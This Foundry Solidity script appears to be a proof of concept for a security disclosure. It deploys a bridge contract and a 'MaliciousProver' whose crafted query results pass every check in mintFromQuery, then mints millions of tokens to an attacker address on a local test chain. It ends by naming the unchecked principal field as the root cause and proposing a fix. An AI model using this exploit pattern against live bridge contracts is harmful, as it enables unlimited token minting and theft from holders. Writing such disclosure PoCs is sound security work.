// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {MintableUSCBridge} from "../contracts/MintableUSCBridge.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {QueryDetails, ResultSegment, QueryState, ChainQuery, LayoutSegment, Balance} from "@gluwa/creditcoin-public-prover/contracts/sol/Prover.sol";

// Minimal concrete implementation so the abstract bridge can be deployed
contract ConcreteUSCBridge is MintableUSCBridge {
    constructor() MintableUSCBridge() ERC20("SpacecoinWrapped", "wSPC") {}
}

// Malicious prover — returns crafted segments that pass every check in mintFromQuery
contract MaliciousProver {
    bytes32 constant TRANSFER_SIG =
        0xddf252ad00000000000000000000000000000000000000000000000000000000;

    address public immutable attacker;
    uint256 public immutable mintAmount;

    constructor(address _attacker, uint256 _mintAmount) {
        attacker   = _attacker;
        mintAmount = _mintAmount;
    }

    function getQueryDetails(bytes32) external view returns (QueryDetails memory qd) {
        ResultSegment[] memory segs = new ResultSegment[](8);
        segs[4].abiBytes = TRANSFER_SIG;                              // passes InvalidFunctionSignature
        segs[5].abiBytes = bytes32(uint256(uint160(attacker)));       // from = attacker (minted here)
        segs[6].abiBytes = bytes32(0);                                // to = address(0) — passes InvalidBurnAddress
        segs[7].abiBytes = bytes32(mintAmount);                       // amount > 0 — passes ZeroAmount
        LayoutSegment[] memory empty = new LayoutSegment[](0);
        qd.state          = QueryState.ResultAvailable;
        qd.query          = ChainQuery({chainId: 0, height: 0, index: 0, layoutSegments: empty});
        qd.escrowedAmount = Balance.wrap(0);
        qd.principal      = attacker;  // NOT checked — this is the vulnerability
        qd.estimatedCost  = Balance.wrap(0);
        qd.timestamp      = 0;
        qd.resultSegments = segs;
    }
}

contract PocUnlimitedMint is Script {
    function run() external {
        // anvil default account[0]
        address attacker = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
        uint256 MINT = 1_000_000 * 10**18;

        vm.startBroadcast();

        ConcreteUSCBridge bridge = new ConcreteUSCBridge();
        console.log("[deploy] ConcreteUSCBridge:", address(bridge));

        MaliciousProver prover = new MaliciousProver(attacker, MINT);
        console.log("[deploy] MaliciousProver:  ", address(prover));

        console.log("[pre]    attacker balance:  0 tokens");
        console.log("[pre]    total supply:      0 tokens");

        bridge.mintFromQuery(address(prover), keccak256("nonce_1"));
        console.log("[call1]  mintFromQuery(maliciousProver, nonce_1)  ->  1,000,000 tokens minted");

        bridge.mintFromQuery(address(prover), keccak256("nonce_2"));
        console.log("[call2]  mintFromQuery(maliciousProver, nonce_2)  ->  1,000,000 tokens minted");

        vm.stopBroadcast();

        uint256 bal = bridge.balanceOf(attacker);
        uint256 sup = bridge.totalSupply();

        console.log("");
        console.log("=== ATTACK CONFIRMED ===");
        console.log("Attacker balance:", bal / 10**18, "tokens");
        console.log("Total supply:    ", sup / 10**18, "tokens");
        console.log("Root cause: mintFromQuery never checks queryDetails.principal.");
        console.log("Fix:        require(hasRole(DEFAULT_ADMIN_ROLE, queryDetails.principal))");
    }
}
